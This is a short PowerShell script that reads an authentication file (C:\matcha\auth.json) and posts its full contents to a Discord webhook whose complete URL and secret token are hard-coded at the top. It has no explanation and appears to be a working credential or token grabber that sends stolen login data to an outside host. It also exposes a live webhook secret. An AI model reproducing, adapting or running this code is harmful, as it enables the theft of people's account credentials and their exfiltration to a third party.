$jsonFilePath = "C:\matcha\auth.json"
$webhookUrl = "https://discord.com/api/webhooks/1360004805409505290/F_ieoTzMxVobyfpI6ov8bD22SFw-MDVar9GEbOLyKIw_XtkyQZpvO9XmRhuij_XGgJ2I"

try {
    $jsonContent = Get-Content $jsonFilePath -Raw
    $jsonObject = ConvertFrom-Json $jsonContent
    $jsonPayload = $jsonObject | ConvertTo-Json
    
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
    Write-Host "Webhook request successful. Response:"
    $response | ConvertTo-Json
} catch {
    Write-Host "Error sending webhook request:"
    $_.Exception.Message
}